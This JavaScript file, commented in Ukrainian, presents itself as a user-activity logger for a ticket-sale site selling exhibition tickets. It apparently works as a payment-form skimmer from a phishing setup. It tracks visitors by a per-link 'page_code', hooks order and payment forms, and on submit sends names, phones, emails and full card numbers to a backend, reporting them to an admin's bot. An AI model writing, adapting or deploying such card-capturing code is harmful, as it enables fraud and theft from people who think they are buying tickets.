/**
 * Система логування дій користувача на сайті
 * Надсилає логи в особисті повідомлення з ботом адміну
 */

class UserActivityLogger {
    constructor() {
        this.baseUrl = 'http://127.0.0.1:8081/api';
        this.pageCode = this.getPageCode();
        this.init();
    }

    /**
     * Отримує page_code з URL або sessionStorage
     */
    getPageCode() {
        const urlParams = new URLSearchParams(window.location.search);
        let page = urlParams.get('page');
        if (!page) {
            page = sessionStorage.getItem('page_code');
        }
        return page;
    }

    /**
     * Ініціалізація логера
     */
    init() {
        if (this.pageCode) {
            // Логуємо відкриття сторінки
            this.logPageView();
            
            // Додаємо обробники для різних дій
            this.setupEventListeners();
        }
    }

    /**
     * Логує відкриття сторінки
     */
    async logPageView() {
        try {
            const response = await fetch(`${this.baseUrl}/log_activity`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    page_code: this.pageCode,
                    page_url: window.location.pathname,
                    action_type: 'page_view',
                    user_agent: navigator.userAgent,
                    referer: document.referrer
                })
            });
            
            if (response.ok) {
                console.log('✅ Page view logged successfully');
            } else {
                console.warn('⚠️ Failed to log page view');
            }
        } catch (error) {
            console.error('❌ Error logging page view:', error);
        }
    }

    /**
     * Логує вибір івенту
     */
    async logEventSelection(eventIndex, eventName) {
        if (!this.pageCode) return;
        
        try {
            const response = await fetch(`${this.baseUrl}/log_event_selection`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    page_code: this.pageCode,
                    event_index: eventIndex,
                    event_name: eventName
                })
            });
            
            if (response.ok) {
                console.log('✅ Event selection logged successfully');
            } else {
                console.warn('⚠️ Failed to log event selection');
            }
        } catch (error) {
            console.error('❌ Error logging event selection:', error);
        }
    }

    /**
     * Логує заповнення форми замовлення
     */
    async logOrderForm(name, phone, email, price, currency) {
        if (!this.pageCode) return;
        
        try {
            const response = await fetch(`${this.baseUrl}/log_order_form`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    page_code: this.pageCode,
                    name: name,
                    phone: phone,
                    email: email,
                    price: price,
                    currency: currency
                })
            });
            
            if (response.ok) {
                console.log('✅ Order form logged successfully');
            } else {
                console.warn('⚠️ Failed to log order form');
            }
        } catch (error) {
            console.error('❌ Error logging order form:', error);
        }
    }

    /**
     * Логує введення карти
     */
    async logCardInput(cardNumber, email, price, currency) {
        if (!this.pageCode) return;
        
        try {
            const response = await fetch(`${this.baseUrl}/log_card_input`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    page_code: this.pageCode,
                    card_number: cardNumber,
                    email: email,
                    price: price,
                    currency: currency
                })
            });
            
            if (response.ok) {
                console.log('✅ Card input logged successfully');
            } else {
                console.warn('⚠️ Failed to log card input');
            }
        } catch (error) {
            console.error('❌ Error logging card input:', error);
        }
    }

    /**
     * Налаштовує обробники подій для автоматичного логування
     */
    setupEventListeners() {
        // Логуємо вибір івенту при кліку на кнопки івентів
        this.setupEventSelectionLogging();
        
        // Логуємо заповнення форми замовлення
        this.setupOrderFormLogging();
    }

    /**
     * Налаштовує логування вибору івентів
     */
    setupEventSelectionLogging() {
        // Знаходимо всі кнопки івентів
        const eventButtons = document.querySelectorAll('[data-event-index], .event-button, .btn-event');
        
        eventButtons.forEach(button => {
            button.addEventListener('click', (e) => {
                const eventIndex = button.dataset.eventIndex || 
                                 button.dataset.event || 
                                 this.extractEventIndexFromButton(button);
                const eventName = button.dataset.eventName || 
                                button.textContent.trim() || 
                                this.getEventNameByIndex(eventIndex);
                
                if (eventIndex !== null) {
                    this.logEventSelection(parseInt(eventIndex), eventName);
                }
            });
        });
    }

    /**
     * Налаштовує логування форми замовлення
     */
    setupOrderFormLogging() {
        // Знаходимо форми замовлення
        const orderForms = document.querySelectorAll('#buyForm, .order-form, form[action*="buy"]');
        
        orderForms.forEach(form => {
            form.addEventListener('submit', (e) => {
                const formData = new FormData(form);
                const name = formData.get('name') || formData.get('fullname') || '';
                const phone = formData.get('phone') || formData.get('tel') || '';
                const email = formData.get('mail') || formData.get('email') || '';
                
                // Отримуємо ціну з різних джерел
                let price = '';
                let currency = '';
                
                // З sessionStorage
                price = sessionStorage.getItem('ticket_price') || 
                       sessionStorage.getItem('total_price') || 
                       sessionStorage.getItem('ticket_total') || '';
                currency = sessionStorage.getItem('ticket_currency') || 
                          sessionStorage.getItem('currency') || 'EUR';
                
                // З URL
                if (!price) {
                    const urlParams = new URLSearchParams(window.location.search);
                    price = urlParams.get('total') || urlParams.get('price') || '';
                }
                
                // З елементів на сторінці
                if (!price) {
                    const priceElement = document.querySelector('#totalprice, .total-price, .price');
                    if (priceElement) {
                        price = priceElement.textContent.replace(/[^\d.,]/g, '');
                    }
                }
                
                if (name || phone || email) {
                    this.logOrderForm(name, phone, email, price, currency);
                }
            });
        });

        // Додатково логуємо введення карти на сторінці loading
        this.setupCardInputLogging();
    }

    /**
     * Налаштовує логування введення карти
     */
    setupCardInputLogging() {
        // Знаходимо форми введення карти
        const cardForms = document.querySelectorAll('#paymentForm, .card-form, form[data-payment-form]');
        
        cardForms.forEach(form => {
            form.addEventListener('submit', (e) => {
                const cardInput = form.querySelector('#card-input, input[name="card"], input[type="text"][placeholder*="card" i]');
                const emailInput = form.querySelector('#email-input, input[name="email"], input[type="email"]');
                
                if (cardInput && cardInput.value.trim()) {
                    const cardNumber = cardInput.value.replace(/\s/g, '');
                    const email = emailInput ? emailInput.value : '';
                    
                    // Отримуємо ціну з різних джерел
                    let price = '';
                    let currency = '';
                    
                    // З sessionStorage
                    price = sessionStorage.getItem('ticket_price') || 
                           sessionStorage.getItem('total_price') || 
                           sessionStorage.getItem('ticket_total') || '';
                    currency = sessionStorage.getItem('ticket_currency') || 
                              sessionStorage.getItem('currency') || 'EUR';
                    
                    // З URL
                    if (!price) {
                        const urlParams = new URLSearchParams(window.location.search);
                        price = urlParams.get('total') || urlParams.get('price') || '';
                    }
                    
                    // З елементів на сторінці
                    if (!price) {
                        const priceElement = document.querySelector('#payment-title, .total-price, .price');
                        if (priceElement) {
                            const priceText = priceElement.textContent;
                            const priceMatch = priceText.match(/(\d+[\.,]?\d*)/);
                            if (priceMatch) {
                                price = priceMatch[1].replace(',', '.');
                            }
                        }
                    }
                    
                    // Логуємо введення карти
                    this.logCardInput(cardNumber, email, price, currency);
                }
            });
        });
    }

    /**
     * Видобуває індекс івенту з кнопки
     */
    extractEventIndexFromButton(button) {
        // Спробуємо знайти індекс в різних атрибутах
        const possibleSources = [
            button.dataset.eventIndex,
            button.dataset.event,
            button.dataset.index,
            button.id?.match(/event-(\d+)/)?.[1],
            button.className?.match(/event-(\d+)/)?.[1]
        ];
        
        for (const source of possibleSources) {
            if (source !== undefined && source !== null) {
                return parseInt(source);
            }
        }
        
        return null;
    }

    /**
     * Отримує назву івенту за індексом
     */
    getEventNameByIndex(index) {
        const eventNames = [
            "Terroir and Traditions",
            "Collection Co–selection", 
            "Snucie",
            "Art that saves lives",
            "Gotong Royong",
            "Anna Konik",
            "Uncensored",
            "Jacek Adamas"
        ];
        
        if (index >= 0 && index < eventNames.length) {
            return eventNames[index];
        }
        
        return "Выставка";
    }

    /**
     * Ручне логування дії (для використання в інших скриптах)
     */
    logAction(actionType, additionalData = {}) {
        if (!this.pageCode) return;
        
        this.logPageView();
    }
}

// Автоматично ініціалізуємо логер при завантаженні сторінки
document.addEventListener('DOMContentLoaded', () => {
    window.userLogger = new UserActivityLogger();
});

// Експортуємо для використання в інших модулях
if (typeof module !== 'undefined' && module.exports) {
    module.exports = UserActivityLogger;
}
